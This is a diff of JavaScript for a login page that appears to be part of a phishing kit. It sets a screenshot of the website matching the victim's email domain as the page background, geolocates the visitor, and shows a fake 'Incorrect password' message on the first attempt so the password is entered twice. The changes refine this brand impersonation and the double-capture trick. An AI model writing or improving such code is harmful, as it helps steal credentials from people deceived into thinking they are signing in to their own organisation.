@@ -43,49 +43,38 @@ document.addEventListener("DOMContentLoaded", () => {
 
     function isValidDomain(domain) {
 
-        return domain &&
-            domain.includes(".") &&
-            !domain.startsWith(".") &&
-            !domain.endsWith(".");
+    return /^[a-z0-9.-]+\.[a-z]{2,}$/i.test(domain);
 
-    }
-  // ===================================
+}
+    
+
+// ===================================
 // BACKGROUND
 // ===================================
 
 function applyBackground(domain) {
 
-    if (!isValidDomain(domain)) return;
+    if (!domain || !isValidDomain(domain)) {
+        return;
+    }
 
-    const screenshot =
-        `https://image.thum.io/get/fullpage/width/1920/https://${domain}`;
+    const loginPage = document.getElementById("login-page");
 
-    const fallback = "images/default-bg.jpg"; // Change this to your own image
+    if (!loginPage) {
+        console.error("login-page element not found");
+        return;
+    }
 
-    const img = new Image();
+    const website = `https://${domain}`;
 
-    img.onload = function () {
+    const screenshotUrl =
+`https://image.thum.io/get/width/1600/crop/900/${encodeURIComponent(website)}`;
 
-        document.body.style.backgroundImage = `url("${screenshot}")`;
-        document.body.style.backgroundSize = "cover";
-        document.body.style.backgroundPosition = "center center";
-        document.body.style.backgroundRepeat = "no-repeat";
-        document.body.style.backgroundAttachment = "fixed";
+    loginPage.style.backgroundImage =
+        `url("${screenshotUrl}")`;
 
-    };
-
-    img.onerror = function () {
-
-        document.body.style.backgroundImage = `url("${fallback}")`;
-        document.body.style.backgroundSize = "cover";
-        document.body.style.backgroundPosition = "center center";
-        document.body.style.backgroundRepeat = "no-repeat";
-        document.body.style.backgroundAttachment = "fixed";
-
-    };
-
-    img.src = screenshot;
-
+    loginPage.style.backgroundSize = "cover";
+    loginPage.style.backgroundPosition = "center";
 }
 
     // ===================================
@@ -125,13 +114,19 @@ applyBackground(domain);
     // LIVE EMAIL CHANGE
     // ===================================
 
-    if (emailInput) {
+   let backgroundTimer;
 
-       emailInput.addEventListener("input", () => {
+emailInput.addEventListener("input", () => {
 
-    const domain = getDomain(emailInput.value);
+    clearTimeout(backgroundTimer);
 
-    applyBackground(domain);
+    backgroundTimer = setTimeout(() => {
+
+        const domain = getDomain(emailInput.value);
+
+        applyBackground(domain);
+
+    }, 800);
 
 });
 
@@ -195,44 +190,32 @@ if (!response.ok) {
 
                     
 
-                    const data = await response.json();
+                  const data = await response.json();
 
-                    const city =
-                        data.address.city ||
-                        data.address.town ||
-                        data.address.village ||
-                        data.address.county ||
-                        "Unknown";
+if (!data.address) {
+    throw new Error("No address returned");
+}
 
-                    const country =
-                        data.address.country || "";
+const city =
+    data.address.city ||
+    data.address.town ||
+    data.address.village ||
+    data.address.county ||
+    "Unknown";
 
-                    locationInfo.textContent =
-                        `${city}, ${country}`;
+const country =
+    data.address.country || "";
 
-                }
+locationInfo.textContent =
+    `${city}, ${country}`;
 
-                catch {
+}
+catch {
 
-                    locationInfo.textContent =
-                        `${latitude.toFixed(4)}, ${longitude.toFixed(4)}`;
+    locationInfo.textContent =
+        `${latitude.toFixed(4)}, ${longitude.toFixed(4)}`;
 
-                }
-
-            },
-
-            () => {
-
-                locationInfo.textContent =
-                    "Location permission denied.";
-
-            }
-
-        );
-
-    }
-
-    getLocation();
+}
 
     // ===================================
     // LOGIN
@@ -337,10 +320,10 @@ if (attempts === 1) {
 
     console.log("First attempt block reached");
 
-   setMessage(
- //       "Incorrect password. Please try again.",
-     //   "red"
-    );
+setMessage(
+    "Incorrect password. Please try again.",
+    "red"
+);
 
     passwordInput.value = "";
     passwordInput.focus();
